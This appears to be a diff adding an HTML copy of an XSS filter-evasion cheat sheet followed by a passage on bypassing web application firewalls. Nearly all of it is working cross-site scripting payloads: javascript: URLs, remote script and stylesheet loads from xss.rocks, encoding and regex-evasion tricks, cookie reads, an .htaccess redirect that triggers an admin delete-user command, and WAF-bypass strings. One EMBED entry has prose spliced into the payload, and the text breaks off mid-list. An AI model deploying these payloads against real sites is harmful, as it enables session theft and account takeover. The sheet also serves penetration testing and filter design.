+<pre>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
+</pre>
+            <h2><span class="mw-headline" id="Remote_style_sheet">Remote style sheet</span></h2>
+            <p>(using something as simple as a remote style sheet you can include your XSS as the style parameter can be
+                redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine
+                mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all
+                of these remote style sheet examples they use the body tag, so it won't work unless there is some
+                content on the page other than the vector itself, so you'll need to add a single letter to the page to
+                make it work if it's an otherwise blank page:
+            </p>
+<pre>&lt;LINK REL="stylesheet" HREF="http:&#47;&#47;xss.rocks/xss.css"&gt;
+</pre>
+            <h2><span class="mw-headline" id="Remote_style_sheet_part_2">Remote style sheet part 2</span></h2>
+            <p>This works the same as above, but uses a &lt;STYLE&gt; tag instead of a &lt;LINK&gt; tag). A slight
+                variation on this vector was used to hack Google Desktop. As a side note, you can remove the end &lt;/STYLE&gt;
+                tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either
+                an equals sign or a slash in your cross site scripting attack, which has come up at least once in the
+                real world:
+            </p>
+<pre>&lt;STYLE&gt;@import'http://xss.rocks/xss.css';&lt;/STYLE&gt;
+</pre>
+            <h2><span class="mw-headline" id="Remote_style_sheet_part_3">Remote style sheet part 3</span></h2>
+            <p>This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link
+                header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera).
+                The trick here is that I am setting a header (which is basically no different than in the HTTP header
+                saying Link: &lt;http://xss.rocks/xss.css&gt;; REL=stylesheet) and the remote style sheet with my cross
+                site scripting vector is running the JavaScript, which is not supported in FireFox:
+            </p>
+<pre>&lt;META HTTP-EQUIV="Link" Content="&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet"&gt;
+</pre>
+            <h2><span class="mw-headline" id="Remote_style_sheet_part_4">Remote style sheet part 4</span></h2>
+            <p>This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think
+                the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the
+                vast majority of sites:
+            </p>
+<pre>&lt;STYLE&gt;BODY{-moz-binding:url("http:&#47;&#47;xss.rocks/xssmoz.xml#xss")}&lt;/STYLE&gt;
+</pre>
+            <h2><span class="mw-headline" id="STYLE_tags_with_broken_up_JavaScript_for_XSS">STYLE tags with broken up JavaScript for XSS</span>
+            </h2>
+            <p>This XSS at times sends IE into an infinite loop of alerts:
+            </p>
+<pre>&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;
+</pre>
+            <h2><span class="mw-headline" id="STYLE_attribute_using_a_comment_to_break_up_expression">STYLE attribute using a comment to break up expression</span>
+            </h2>
+            <p>Created by Roman Ivanov
+            </p>
+<pre>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;
+</pre>
+            <h2><span class="mw-headline" id="IMG_STYLE_with_expression">IMG STYLE with expression</span></h2>
+            <p>This is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to
+                parse apart, like above this can send IE into a loop:
+            </p>
+<pre>exp/*&lt;A STYLE='no\xss:noxss("*//*");
+xss:&#101;x&#x2f;*XSS*//*/*/pression(alert("XSS"))'&gt;
+</pre>
+            <h2><span class="mw-headline" id="STYLE_tag_.28Older_versions_of_Netscape_only.29">STYLE tag (Older versions of Netscape only)</span>
+            </h2>
+<pre>&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;
+</pre>
+            <h2><span class="mw-headline" id="STYLE_tag_using_background-image">STYLE tag using background-image</span>
+            </h2>
+<pre>&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+</pre>
+            <h2><span class="mw-headline" id="STYLE_tag_using_background">STYLE tag using background</span></h2>
+<pre>&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
+</pre>
+            <p>&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
+            </p>
+            <h2><span class="mw-headline"
+                      id="Anonymous_HTML_with_STYLE_attribute">Anonymous HTML with STYLE attribute</span></h2>
+            <p>IE6.0 and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or
+                not, as long as it starts with an open angle bracket and a letter:
+            </p>
+<pre>&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;
+</pre>
+            <h2><span class="mw-headline" id="Local_htc_file">Local htc file</span></h2>
+            <p>This is a little different than the above two cross site scripting vectors because it uses an .htc file
+                which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript
+                and running it as part of the style attribute:
+            </p>
+<pre>&lt;XSS STYLE="behavior: url(xss.htc);"&gt;
+</pre>
+            <h2><span class="mw-headline" id="US-ASCII_encoding">US-ASCII encoding</span></h2>
+            <p>US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This
+                XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you
+                set the encoding yourself. This is more useful against web application firewall cross site scripting
+                evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in
+                US-ASCII encoding.
+            </p>
+<pre>¼script¾alert(¢XSS¢)¼/script¾
+</pre>
+            <h2><span class="mw-headline" id="META">META</span></h2>
+            <p>The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for
+                certain types of attacks where you need to get rid of referring URLs:
+            </p>
+<pre>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;
+</pre>
+            <h3><span class="mw-headline" id="META_using_data">META using data</span></h3>
+            <p>Directive URL scheme. This is nice because it also doesn't have anything visibly that has the word SCRIPT
+                or the JavaScript directive in it, because it utilizes base64 encoding. Please see <a
+                        class="external mw-magiclink-rfc" rel="nofollow" href="//tools.ietf.org/html/rfc2397">RFC
+                    2397</a> for more details or go here or here to encode your own. You can also use the XSS <a
+                        rel="nofollow" class="external text" href="http://ha.ckers.org/xsscalc.html">calculator</a>
+                below if you just want to encode raw HTML or JavaScript as it has a Base64 encoding method:
+            </p>
+<pre>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;
+</pre>
+            <h3><span class="mw-headline"
+                      id="META_with_additional_URL_parameter">META with additional URL parameter</span></h3>
+            <p>If the target website attempts to see if the URL contains "http:&#47;&#47;" at the beginning you can
+                evade it with the following technique (Submitted by Moritz Naumann):
+            </p>
+<pre>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;
+</pre>
+            <h2><span class="mw-headline" id="IFRAME">IFRAME</span></h2>
+            <p>If iframes are allowed there are a lot of other XSS problems as well:
+            </p>
+<pre>&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
+</pre>
+            <h2><span class="mw-headline" id="IFRAME_Event_based">IFRAME Event based</span></h2>
+            <p>IFrames and most other elements can use event based mayhem like the following...
+                (Submitted by: David Cross)
+            </p>
+<pre>&lt;IFRAME SRC=# onmouseover="alert(document.cookie)"&gt;&lt;/IFRAME&gt;
+</pre>
+            <h2><span class="mw-headline" id="FRAME">FRAME</span></h2>
+            <p>Frames have the same sorts of XSS problems as iframes
+            </p>
+<pre>&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;
+</pre>
+            <p><br/>
+            </p>
+            <h2><span class="mw-headline" id="TABLE">TABLE</span></h2>
+<pre>&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
+</pre>
+            <h3><span class="mw-headline" id="TD">TD</span></h3>
+            <p>Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:
+            </p>
+<pre>&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;
+</pre>
+            <h2><span class="mw-headline" id="DIV">DIV</span></h2>
+            <h3><span class="mw-headline" id="DIV_background-image">DIV background-image</span></h3>
+<pre>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;
+</pre>
+            <h3><span class="mw-headline" id="DIV_background-image_with_unicoded_XSS_exploit">DIV background-image with unicoded XSS exploit</span>
+            </h3>
+            <p>This has been modified slightly to obfuscate the url parameter. The original vulnerability was found by
+                Renaud Lifchitz as a vulnerability in Hotmail:
+            </p>
+<pre>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;
+</pre>
+            <h3><span class="mw-headline" id="DIV_background-image_plus_extra_characters">DIV background-image plus extra characters</span>
+            </h3>
+            <p>Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open
+                parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in
+                decimal but you can include hex and add padding of course. (Any of the following chars can be used:
+                1-32, 34, 39, 160, 8192-8.13, 12288, 65279):
+            </p>
+<pre>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"&gt;
+</pre>
+            <h3><span class="mw-headline" id="DIV_expression">DIV expression</span></h3>
+            <p>A variant of this was effective against a real world cross site scripting filter using a newline between
+                the colon and "expression":
+            </p>
+<pre>&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;
+</pre>
+            <h2><span class="mw-headline" id="Downlevel-Hidden_block">Downlevel-Hidden block</span></h2>
+            <p>Only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider
+                anything inside a comment block to be safe and therefore does not need to be removed, which allows our
+                Cross Site Scripting vector. Or the system could add comment tags around something to attempt to render
+                it harmless. As we can see, that probably wouldn't do the job:
+            </p>
+<pre>&lt;!--[if gte IE 4]&gt;
+ &lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
+ &lt;![endif]--&gt;
+</pre>
+            <h2><span class="mw-headline" id="BASE_tag">BASE tag</span></h2>
+            <p>Works in IE and Netscape 8.1 in safe mode. You need the // to comment out the next characters so you
+                won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the
+                website uses dynamically placed images like "images/image.jpg" rather than full paths. If the path
+                includes a leading forward slash like "/images/image.jpg" you can remove one slash from this vector (as
+                long as there are two to begin the comment this will work):
+            </p>
+<pre>&lt;BASE HREF="javascript:alert('XSS');//"&gt;
+</pre>
+            <h2><span class="mw-headline" id="OBJECT_tag">OBJECT tag</span></h2>
+            <p>If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the
+                APPLET tag). The linked file is actually an HTML file that can contain your XSS:
+            </p>
+<pre> &lt;OBJECT TYPE="text/x-scriptlet" DATA="http:&#47;&#47;xss.rocks/scriptlet.html"&gt;&lt;/OBJECT&gt;
+</pre>
+            <h2><span class="mw-headline" id="Using_an_EMBED_tag_you_can_embed_a_Flash_movie_that_contains_XSS">Using an EMBED tag you can embed a Flash movie that contains XSS</span>
+            </h2>
+            <p>Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal"
+                it can mitigate this risk (thank you to Jonathan Vanasco for the info).:
+            </p>
+<pre>EMBED SRC="http:&#47;&#47;ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:
+org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
+</pre>
+            <h2><span class="mw-headline" id="You_can_EMBED_SVG_which_can_contain_your_XSS_vector">You can EMBED SVG which can contain your XSS vector</span>
+            </h2>
+            <p>This example only works in Firefox, but it's better than the above vector in Firefox because it does not
+                require the user to have Flash turned on or installed. Thanks to nEUrOO for this one.
+            </p>
+<pre>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
+</pre>
+            <h2><span class="mw-headline" id="Using_ActionScript_inside_flash_can_obfuscate_your_XSS_vector">Using ActionScript inside flash can obfuscate your XSS vector</span>
+            </h2>
+<pre>a="get";
+b="URL(\"";
+c="javascript:";
+d="alert('XSS');\")";
+eval(a+b+c+d);
+</pre>
+            <h2><span class="mw-headline" id="XML_data_island_with_CDATA_obfuscation">XML data island with CDATA obfuscation</span>
+            </h2>
+            <p>This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec
+                Consult while auditing Yahoo:
+            </p>
+<pre>&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC="javas&lt;!-- --&gt;cript:alert('XSS')"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;
+</pre>
+            <h2><span class="mw-headline"
+                      id="Locally_hosted_XML_with_embedded_JavaScript_that_is_generated_using_an_XML_data_island">Locally hosted XML with embedded JavaScript that is generated using an XML data island</span>
+            </h2>
+            <p>This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file
+                that contains your cross site scripting vector. You can see the result here:
+            </p>
+<pre>&lt;XML SRC="xsstest.xml" ID=I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+</pre>
+            <h2><span class="mw-headline" id="HTML.2BTIME_in_XML">HTML+TIME in XML</span></h2>
+            <p>This is how Grey Magic hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1
+                in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to
+                work:
+            </p>
+<pre>&lt;HTML&gt;&lt;BODY&gt;
+&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;
+&lt;?import namespace="t" implementation="#default#time2"&gt;
+&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+</pre>
+            <p><br/>
+            </p>
+            <h2><span class="mw-headline"
+                      id="Assuming_you_can_only_fit_in_a_few_characters_and_it_filters_against_.22.js.22">Assuming you can only fit in a few characters and it filters against ".js"</span>
+            </h2>
+            <p>you can rename your JavaScript file to an image as an XSS vector:
+            </p>
+<pre>&lt;SCRIPT SRC="http:&#47;&#47;xss.rocks/xss.jpg"&gt;&lt;/SCRIPT&gt;
+</pre>
+            <p><br/>
+            </p>
+            <h2><span class="mw-headline" id="SSI_.28Server_Side_Includes.29">SSI (Server Side Includes)</span></h2>
+            <p>This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention
+                this, but if you can run commands on the server there are no doubt much more serious issues:
+            </p>
+<pre>&lt;!--#exec cmd="/bin/echo '&lt;SCR'"--&gt;&lt;!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;'"--&gt;
+</pre>
+            <p><br/>
+            </p>
+            <h2><span class="mw-headline" id="PHP">PHP</span></h2>
+            <p>Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts
+                remotely like this, there are probably much more dire issues:
+            </p>
+<pre>&lt;? echo('&lt;SCR)';
+echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;
+</pre>
+            <p><br/>
+            </p>
+            <h2><span class="mw-headline" id="IMG_Embedded_commands">IMG Embedded commands</span></h2>
+            <p>This works when the webpage where this is injected (like a web-board) is behind password protection and
+                that password protection works with other commands on the same domain. This can be used to delete users,
+                add users (if the user who visits the page is an administrator), send credentials elsewhere, etc....
+                This is one of the lesser used but more useful XSS vectors:
+            </p>
+<pre>&lt;IMG SRC="http:&#47;&#47;www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;
+</pre>
+            <p><br/>
+            </p>
+            <h3><span class="mw-headline" id="IMG_Embedded_commands_part_II">IMG Embedded commands part II</span></h3>
+            <p>This is more scary because there are absolutely no identifiers that make it look suspicious other than it
+                is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image
+                back to a command. So a normal &lt;IMG SRC="httx://badguy.com/a.jpg"&gt; could actually be an attack
+                vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line
+                to accomplish the vector (thanks to Timo for part of this):
+            </p>
+<pre>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
+</pre>
+            <h2><span class="mw-headline" id="Cookie_manipulation">Cookie manipulation</span></h2>
+            <p>Admittedly this is pretty obscure but I have seen a few examples where &lt;META is allowed and you can
+                use it to overwrite cookies. There are other examples of sites where instead of fetching the username
+                from a database it is stored inside of a cookie to be displayed only to the user who visits the page.
+                With these two scenarios combined you can modify the victim's cookie which will be displayed back to
+                them as JavaScript (you can also use this to log people out or change their user states, get them to log
+                in as you, etc...):
+            </p>
+<pre>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt;
+</pre>
+            <h2><span class="mw-headline" id="UTF-7_encoding">UTF-7 encoding</span></h2>
+            <p>If the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to
+                UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov for this one). Click here for
+                an example (you don't need the charset statement if the user's browser is set to auto-detect and there
+                is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine
+                mode). This does not work in any modern browser without changing the encoding type which is why it is
+                marked as completely unsupported. Watchfire found this hole in Google's custom 404 script.:
+            </p>
+<pre> &lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+</pre>
+            <h2><span class="mw-headline"
+                      id="XSS_using_HTML_quote_encapsulation">XSS using HTML quote encapsulation</span></h2>
+            <p>This was tested in IE, your mileage may vary. For performing XSS on sites that allow "&lt;SCRIPT&gt;" but
+                don't allow "&lt;SCRIPT SRC..." by way of a regex filter "/&lt;script[^&gt;]+src/i":
+            </p>
+<pre>&lt;SCRIPT a="&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+</pre>
+            <p>For performing XSS on sites that allow "&lt;SCRIPT&gt;" but don't allow "&lt;script src..." by way of a
+                regex filter "/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i" (this is an
+                important one, because I've seen this regex in the wild):
+            </p>
+<pre>&lt;SCRIPT ="&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+</pre>
+            <p>Another XSS to evade the same filter, "/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i":
+            </p>
+<pre>&lt;SCRIPT a="&gt;" '' SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+</pre>
+            <p>Yet another XSS to evade the same filter, "/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i".
+                I know I said I wasn't goint to discuss mitigation techniques but the only thing I've seen work for this
+                XSS example if you still want to allow &lt;SCRIPT&gt; tags but not remote script is a state machine (and
+                of course there are other ways to get around this if they allow &lt;SCRIPT&gt; tags):
+            </p>
+<pre>&lt;SCRIPT "a='&gt;'" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+</pre>
+            <p>And one last XSS attack to evade, "/&lt;script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'"&gt;\s]+))?)+\s*|\s*)src/i"
+                using grave accents (again, doesn't work in Firefox):
+            </p>
+<pre>&lt;SCRIPT a=`&gt;` SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+</pre>
+            <p>Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will
+                rather find any quotes to terminate a parameter string improperly:
+            </p>
+<pre>&lt;SCRIPT a="&gt;'&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+</pre>
+            <p>This XSS still worries me, as it would be nearly impossible to stop this without blocking all active
+                content:
+            </p>
+<pre>&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+</pre>
+            <h2><span class="mw-headline" id="URL_string_evasion">URL string evasion</span></h2>
+            <p>Assuming "http:&#47;&#47;www.google.com/" is pro grammatically disallowed:
+            </p>
+            <h3><span class="mw-headline" id="IP_verses_hostname">IP verses hostname</span></h3>
+<pre>&lt;A HREF="http:&#47;&#47;66.102.7.147/"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="URL_encoding">URL encoding</span></h3>
+<pre>&lt;A HREF="http:&#47;&#47;%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="Dword_encoding">Dword encoding</span></h3>
+            <p>(Note: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more
+                details):
+            </p>
+<pre>&lt;A HREF="http:&#47;&#47;1113982867/"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="Hex_encoding">Hex encoding</span></h3>
+            <p>The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can
+                see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex
+                quotet is not required):
+            </p>
+<pre>&lt;A HREF="http:&#47;&#47;0x42.0x0000066.0x7.0x93/"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="Octal_encoding">Octal encoding</span></h3>
+            <p>Again padding is allowed, although you must keep it above 4 total characters per class - as in class A,
+                class B, etc...:
+            </p>
+<pre>&lt;A HREF="http:&#47;&#47;0102.0146.0007.00000223/"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="Mixed_encoding">Mixed encoding</span></h3>
+            <p>Let's mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I'll
+                never know). The tabs and newlines only work if this is encapsulated with quotes:
+            </p>
+<pre>&lt;A HREF="h
+tt	p://6&#9;6.000146.0x7.147/"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="Protocol_resolution_bypass">Protocol resolution bypass</span></h3>
+            <p>(// translates to http:// which saves a few more bytes). This is really handy when space is an issue too
+                (two less characters can go a long way) and can easily bypass regex like "(ht|f)tp(s)?://" (thanks to
+                Ozh for part of this one). You can also change the "//" to "\\". You do need to keep the slashes in
+                place, however, otherwise this will be interpreted as a relative path URL.
+            </p>
+<pre>&lt;A HREF="//www.google.com/"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="Google_.22feeling_lucky.22_part_1.">Google "feeling lucky" part 1.</span>
+            </h3>
+            <p>Firefox uses Google's "feeling lucky" function to redirect the user to any keywords you type in. So if
+                your exploitable page is the top for some random keyword (as you see here) you can use that feature
+                against any Firefox user. This uses Firefox's "keyword:" protocol. You can concatenate several keywords
+                by using something like the following "keyword:XSS+RSnake" for instance. This no longer works within
+                Firefox as of 2.0.
+            </p>
+<pre>&lt;A HREF="//google"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="Google_.22feeling_lucky.22_part_2.">Google "feeling lucky" part 2.</span>
+            </h3>
+            <p>This uses a very tiny trick that appears to work Firefox only, because if it's implementation of the
+                "feeling lucky" function. Unlike the next one this does not work in Opera because Opera believes that
+                this is the old HTTP Basic Auth phishing attack, which it is not. It's simply a malformed URL. If you
+                click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that
+                this is not supported in Opera, and it is no longer supported in Firefox as of 2.0:
+            </p>
+<pre>&lt;A HREF="http:&#47;&#47;ha.ckers.org@google"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="Google_.22feeling_lucky.22_part_3.">Google "feeling lucky" part 3.</span>
+            </h3>
+            <p>This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation
+                of the "feeling lucky" function. Like all of the above it requires that you are #1 in Google for the
+                keyword in question (in this case "google"):
+            </p>
+<pre>&lt;A HREF="http:&#47;&#47;google:ha.ckers.org"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="Removing_cnames">Removing cnames</span></h3>
+            <p>When combined with the above URL, removing "www." will save an additional 4 bytes for a total byte
+                savings of 9 for servers that have this set up properly):
+            </p>
+<pre>&lt;A HREF="http:&#47;&#47;google.com/"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="Extra_dot_for_absolute_DNS:">Extra dot for absolute DNS:</span></h3>
+<pre>&lt;A HREF="http:&#47;&#47;www.google.com./"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="JavaScript_link_location:">JavaScript link location:</span></h3>
+<pre>&lt;A HREF="javascript:document.location='http://www.google.com/'"&gt;XSS&lt;/A&gt;
+</pre>
+            <h3><span class="mw-headline" id="Content_replace_as_attack_vector">Content replace as attack vector</span>
+            </h3>
+            <p>Assuming "http:&#47;&#47;www.google.com/" is programmatically replaced with nothing). I actually used a
+                similar attack vector against a several separate real world XSS filters by using the conversion filter
+                itself (here is an example) to help create the attack vector (IE: "java&#x26;#x09;script:" was converted
+                into "java&#x9;script:", which renders in IE, Netscape 8.1+ in secure site mode and Opera):
+            </p>
+<pre>&lt;A HREF="http://www.google.com/ogle.com/"&gt;XSS&lt;/A&gt;
+</pre>
+            <h2><span class="mw-headline" id="Character_escape_sequences">Character escape sequences</span></h2>
+            <p>All the possible combinations of the character "&lt;" in HTML and JavaScript. Most of these won't render
+                out of the box, but many of them can get rendered in certain circumstances as seen above.
+            </p>
+<pre>&lt;
+%3C
+&amp;lt
+&amp;lt;
+&amp;LT
+&amp;LT;
+&amp;#60
+&amp;#060
+&amp;#0060
+&amp;#00060
+&amp;#000060
+&amp;#0000060
+&amp;#60;
+&amp;#060;
+&amp;#0060;
+&amp;#00060;
+&amp;#000060;
+&amp;#0000060;
+&amp;#x3c
+&amp;#x03c
+&amp;#x003c
+&amp;#x0003c
+&amp;#x00003c
+&amp;#x000003c
+&amp;#x3c;
+&amp;#x03c;
+&amp;#x003c;
+&amp;#x0003c;
+&amp;#x00003c;
+&amp;#x000003c;
+&amp;#X3c
+&amp;#X03c
+&amp;#X003c
+&amp;#X0003c
+&amp;#X00003c
+&amp;#X000003c
+&amp;#X3c;
+&amp;#X03c;
+&amp;#X003c;
+&amp;#X0003c;
+&amp;#X00003c;
+&amp;#X000003c;
+&amp;#x3C
+&amp;#x03C
+&amp;#x003C
+&amp;#x0003C
+&amp;#x00003C
+&amp;#x000003C
+&amp;#x3C;
+&amp;#x03C;
+&amp;#x003C;
+&amp;#x0003C;
+&amp;#x00003C;
+&amp;#x000003C;
+&amp;#X3C
+&amp;#X03C
+&amp;#X003C
+&amp;#X0003C
+&amp;#X00003C
+&amp;#X000003C
+&amp;#X3C;
+&amp;#X03C;
+&amp;#X003C;
+&amp;#X0003C;
+&amp;#X00003C;
+&amp;#X000003C;
+\x3c
+\x3C
+\u003c
+\u003C
+</pre>
+            <p><br/>
+            </p>
+            <h1><span class="mw-headline" id="Methods_to_Bypass_WAF_.E2.80.93_Cross-Site_Scripting">Methods to Bypass WAF – Cross-Site Scripting</span>
+            </h1>
+            <p>General issues<br/>
+                • Stored XSS
+            </p>
+            <p>If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack
+                conduction.<br/>
+                • Reflected XSS in Javascript
+            </p>
+<pre> Example: &lt;script&gt; ... setTimeout(\"writetitle()\",$_GET[xss]) ... &lt;/script&gt;
+ Exploitation: /?xss=500); alert(document.cookie);//
+</pre>
+            <p>• DOM-based XSS
+            </p>
+<pre> Example: &lt;script&gt; ... eval($_GET[xss]); ... &lt;/script&gt;
+ Exploitation: /?xss=document.cookie
+</pre>
+            <p><b>XSS via request Redirection.</b><br/>
+                • Vulnerable code:
+            </p>
+<pre> ...
+ header('Location: '.$_GET['param']);
+ ...
+</pre>
+            <p>As well as:
+            </p>
+<pre> ...
+ header('Refresh: 0; URL='.$_GET['param']);
+ ...
+</pre>
+            <p>• This request will not pass through the WAF:
+            </p>
+<pre> /?param=javascript:alert(document.cookie)
+</pre>
+            <p>• This request will pass through the WAF and an XSS attack will be conducted in certain browsers.
+            </p>
+<pre> /?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=<br/>
+</pre>
+            <p><b>WAF ByPass Strings for XSS.</b>
+            </p>
+<pre>&lt;Img src = x onerror = "javascript: window.onerror = alert; throw XSS"&gt;
